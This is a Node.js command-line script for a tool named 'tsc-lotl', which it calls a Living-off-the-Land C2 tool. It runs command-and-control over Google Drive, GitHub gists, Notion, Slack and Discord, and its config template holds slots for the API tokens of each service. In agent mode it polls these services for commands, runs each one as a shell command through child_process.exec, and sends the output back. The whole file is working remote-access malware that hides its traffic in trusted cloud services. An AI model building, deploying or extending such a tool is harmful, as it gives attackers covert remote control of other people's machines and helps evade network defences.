#!/usr/bin/env node

const minimist = require('minimist');
const path = require('path');
const fs = require('fs');
const LotlC2 = require('../src/lotl-c2');

const argv = minimist(process.argv.slice(2));
const cmd = argv._[0];

function showHelp() {
  console.log(`
tsc-lotl — Living-off-the-Land C2 Tool  v1.0.0

Usage:
  tsc-lotl server --config <path>          Start C2 server listening on all channels
  tsc-lotl agent --config <path> --id <id>  Start agent polling all channels
  tsc-lotl send --channel <ch> --agent <id> --cmd <cmd>  Send a single command
  tsc-lotl config init                      Generate a blank config template
  tsc-lotl channels                          List all available channels with status
  tsc-lotl help                              Show this help message

Channels: gdrive, github, notion, slack, discord
`);
}

function generateConfig() {
  const template = {
    encryptionKey: 'CHANGE_ME_TO_A_32_CHAR_KEY____',
    channelPriority: ['gdrive', 'github', 'notion', 'slack', 'discord'],
    channels: {
      gdrive: {
        accessToken: 'YOUR_GOOGLE_DRIVE_ACCESS_TOKEN',
        folderName: '.tsc_lotl_c2'
      },
      github: {
        token: 'YOUR_GITHUB_PERSONAL_ACCESS_TOKEN',
        gistPrefix: 'tsc-lotl-cmd-'
      },
      notion: {
        apiKey: 'YOUR_NOTION_INTEGRATION_TOKEN',
        databaseId: 'YOUR_NOTION_DATABASE_ID'
      },
      slack: {
        webhookUrl: 'https://hooks.slack.com/services/YOUR/WEBHOOK/URL',
        token: 'YOUR_SLACK_BOT_TOKEN',
        channelId: 'YOUR_SLACK_CHANNEL_ID'
      },
      discord: {
        webhookId: 'YOUR_DISCORD_WEBHOOK_ID',
        webhookToken: 'YOUR_DISCORD_WEBHOOK_TOKEN',
        botToken: 'YOUR_DISCORD_BOT_TOKEN',
        channelId: 'YOUR_DISCORD_CHANNEL_ID'
      }
    }
  };

  const outPath = path.resolve('tsc-lotl-config.json');
  fs.writeFileSync(outPath, JSON.stringify(template, null, 2));
  console.log(`Config template written to: ${outPath}`);
}

async function listChannels(configPath) {
  const c2 = new LotlC2(configPath);
  console.log('\nChannel status:');
  console.log('─'.repeat(40));
  for (const ch of c2.channelPriority) {
    if (c2.channels[ch]) {
      process.stdout.write(`${ch} ... testing ...`);
      const status = await c2.testChannel(ch);
      process.stdout.clearLine();
      process.stdout.cursorTo(0);
      console.log(`${ch.padEnd(12)} ${status.status}`);
    }
  }
}

async function runServer(configPath) {
  const c2 = new LotlC2(configPath);
  console.log('[tsc-lotl] C2 Server started');
  console.log(`[tsc-lotl] Channels: ${c2.channelPriority.filter(ch => c2.channels[ch]).join(', ')}`);
  console.log('[tsc-lotl] Listening for agent commands...');

  const activeChannels = c2.channelPriority.filter(ch => c2.channels[ch]);

  const pollInterval = setInterval(async () => {
    for (const ch of activeChannels) {
      const status = c2.channelStatus[ch];
      const display = status === 'up' ? '✓' : status === 'down' ? '✗' : '?';
      process.stdout.write(`\r[${display}] ${ch} — polling for results... `);
    }

    // Check for results on all channels (this would be expanded in a real server)
  }, 30000);

  process.on('SIGINT', () => {
    clearInterval(pollInterval);
    console.log('\n[tsc-lotl] Server shutting down');
    process.exit(0);
  });

  // Keep alive
  await new Promise(() => {});
}

async function runAgent(configPath, agentId) {
  const c2 = new LotlC2(configPath);
  console.log(`[tsc-lotl] Agent "${agentId}" started`);
  console.log('[tsc-lotl] Polling all channels for commands...');

  const activeChannels = c2.channelPriority.filter(ch => c2.channels[ch]);

  const poll = async () => {
    for (const ch of activeChannels) {
      try {
        const commands = await c2.pollCommands(ch, agentId);
        for (const cmd of commands) {
          console.log(`[${ch}] Received command: ${cmd.command}`);
          try {
            const execResult = await executeCommand(cmd.command);
            console.log(`[${ch}] Result: ${execResult}`);
            await c2.sendResult(ch, agentId, execResult);
          } catch (execErr) {
            console.error(`[${ch}] Command error: ${execErr.message}`);
            await c2.sendResult(ch, agentId, `ERROR: ${execErr.message}`);
          }
        }
      } catch (err) {
        // channel unavailable
      }
    }
  };

  await poll();
  setInterval(poll, 15000);

  process.on('SIGINT', () => {
    console.log('\n[tsc-lotl] Agent shutting down');
    process.exit(0);
  });
}

function executeCommand(cmd) {
  return new Promise((resolve, reject) => {
    const cp = require('child_process');
    cp.exec(cmd, { timeout: 30000 }, (err, stdout, stderr) => {
      if (err) {
        reject(new Error(err.message + (stderr ? ': ' + stderr : '')));
      } else {
        resolve(stdout || '(no output)');
      }
    });
  });
}

async function sendCommand(configPath, channel, agentId, command) {
  const c2 = new LotlC2(configPath);
  try {
    const result = await c2.sendCommand(channel, agentId, command);
    console.log(`Command sent via ${channel}: ${JSON.stringify(result)}`);
  } catch (err) {
    console.error(`Failed to send command: ${err.message}`);
    process.exit(1);
  }
}

async function main() {
  switch (cmd) {
    case 'server':
      if (!argv.config) {
        console.error('Error: --config is required');
        process.exit(1);
      }
      await runServer(path.resolve(argv.config));
      break;

    case 'agent':
      if (!argv.config || !argv.id) {
        console.error('Error: --config and --id are required');
        process.exit(1);
      }
      await runAgent(path.resolve(argv.config), argv.id);
      break;

    case 'send':
      if (!argv.config || !argv.channel || !argv.agent || !argv.cmd) {
        console.error('Error: --config, --channel, --agent, and --cmd are required');
        process.exit(1);
      }
      await sendCommand(path.resolve(argv.config), argv.channel, argv.agent, argv.cmd);
      break;

    case 'config':
      if (argv._[1] === 'init') {
        generateConfig();
      } else {
        console.error('Usage: tsc-lotl config init');
        process.exit(1);
      }
      break;

    case 'channels':
      if (!argv.config) {
        console.error('Error: --config is required');
        process.exit(1);
      }
      await listChannels(path.resolve(argv.config));
      break;

    case 'help':
    case undefined:
    default:
      showHelp();
      break;
  }
}

main().catch(err => {
  console.error(`Error: ${err.message}`);
  process.exit(1);
});
